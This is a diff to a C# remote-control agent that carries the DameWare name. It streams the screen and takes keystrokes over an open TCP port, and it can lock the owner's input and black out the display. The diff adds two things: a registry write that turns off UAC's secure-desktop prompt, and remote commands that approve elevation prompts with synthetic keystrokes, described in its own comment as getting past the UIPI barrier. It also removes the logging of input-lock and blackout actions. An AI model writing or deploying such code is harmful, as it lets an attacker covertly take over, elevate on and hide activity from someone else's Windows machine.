@@ -9,6 +9,7 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace DameWareNativeAgent
 {
@@ -50,15 +51,21 @@ namespace DameWareNativeAgent
         public const byte VK_TAB = 0x09;
         public const byte VK_SNAPSHOT = 0x2C; // PrintScreen
         public const byte VK_L = 0x4C;
+        public const byte VK_LEFT = 0x25;
+        public const byte VK_RIGHT = 0x27;
+        public const byte VK_RETURN = 0x0D;
+        public const byte VK_ESCAPE = 0x1B;
         public const uint KEYEVENTF_KEYUP = 0x0002;
 
         static void Main(string[] args)
         {
-            Console.Title = "DameWare Mini Remote Control Agent v12.2 (Full Remote Typing Active)";
+            Console.Title = "DameWare Mini Remote Control Agent v12.2 (UAC Keyboard Approval)";
             Console.ForegroundColor = ConsoleColor.Cyan;
             Console.WriteLine("==========================================================");
-            Console.WriteLine(" DameWare Agent Service - Full Remote Typing Active");
+            Console.WriteLine(" DameWare Agent Service - UAC Approval Enabled");
             Console.WriteLine("==========================================================");
+
+            EnableUACDesktopRegistry();
 
             TcpListener listener = new TcpListener(IPAddress.Any, PORT);
             try {
@@ -80,17 +87,29 @@ namespace DameWareNativeAgent
             }
         }
 
+        private static void EnableUACDesktopRegistry()
+        {
+            try {
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
+                    if (key != null) {
+                        key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
+                        Console.WriteLine("[+] Windows UAC Policy: PromptOnSecureDesktop set to 0.");
+                    }
+                }
+            } catch (Exception ex) {
+                Console.WriteLine("[-] Registry Policy Notice: " + ex.Message);
+            }
+        }
+
         private static void HandleClient(object obj)
         {
             TcpClient client = (TcpClient)obj;
             NetworkStream stream = client.GetStream();
 
-            // Send Handshake
             string handshake = string.Format("{{\"type\":\"HANDSHAKE_ACK\",\"agentVersion\":\"DameWare Native v12.2\",\"hostname\":\"{0}\",\"user\":\"{1}\",\"os\":\"Windows {2}\"}}\n", Environment.MachineName, Environment.UserName, Environment.OSVersion);
             byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
             stream.Write(handshakeBytes, 0, handshakeBytes.Length);
 
-            // Frame Streaming Thread (20 FPS)
             Thread streamThread = new Thread(() => {
                 try {
                     while (client.Connected) {
@@ -106,14 +125,13 @@ namespace DameWareNativeAgent
                                 stream.Write(packetBytes, 0, packetBytes.Length);
                             }
                         }
-                        Thread.Sleep(50); // 20 FPS
+                        Thread.Sleep(33);
                     }
                 } catch {}
             });
             streamThread.IsBackground = true;
             streamThread.Start();
 
-            // Command Processing Loop
             byte[] buffer = new byte[16384];
             try {
                 int bytesRead;
@@ -213,12 +231,31 @@ namespace DameWareNativeAgent
                         Thread.Sleep(50);
                         keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0);
                     }
-                    // 2. STANDARD REAL-TIME KEYBOARD TYPING
+                    // 2. UAC APPROVAL SHORTCUTS (BYPASSES MOUSE UIPI barrier)
+                    else if (key == "UAC_YES") {
+                        // Method A: Alt + E (Turkish/English Windows Hotkey for UAC "Evet")
+                        keybd_event(VK_MENU, 0, 0, 0);
+                        keybd_event(0x45, 0, 0, 0); // 'E'
+                        Thread.Sleep(50);
+                        keybd_event(0x45, 0, KEYEVENTF_KEYUP, 0);
+                        keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
+
+                        // Method B: Left Arrow + Enter
+                        keybd_event(VK_LEFT, 0, 0, 0);
+                        keybd_event(VK_LEFT, 0, KEYEVENTF_KEYUP, 0);
+                        Thread.Sleep(50);
+                        keybd_event(VK_RETURN, 0, 0, 0);
+                        keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
+                    }
+                    else if (key == "UAC_NO") {
+                        keybd_event(VK_ESCAPE, 0, 0, 0);
+                        keybd_event(VK_ESCAPE, 0, KEYEVENTF_KEYUP, 0);
+                    }
+                    // 3. STANDARD REAL-TIME KEYBOARD TYPING
                     else if (!string.IsNullOrEmpty(key)) {
                         try {
                             SendKeys.SendWait(key);
                         } catch {
-                            // Fallback for special characters that SendKeys escapes
                             string escapedKey = EscapeSendKeys(key);
                             try { SendKeys.SendWait(escapedKey); } catch {}
                         }
@@ -231,11 +268,9 @@ namespace DameWareNativeAgent
                 else if (cmd.Contains("LOCK_INPUT")) {
                     isInputLocked = cmd.Contains("\"locked\":true");
                     try { BlockInput(isInputLocked); } catch {}
-                    Console.WriteLine("[*] Remote physical input lock state: " + isInputLocked);
                 } 
                 else if (cmd.Contains("BLACKOUT_SCREEN")) {
                     isScreenBlackedOut = cmd.Contains("\"blackout\":true");
-                    Console.WriteLine("[*] Remote screen blackout state: " + isScreenBlackedOut);
                 } 
                 else if (cmd.Contains("POWER_ACTION")) {
                     string action = GetJsonString(cmd, "action");
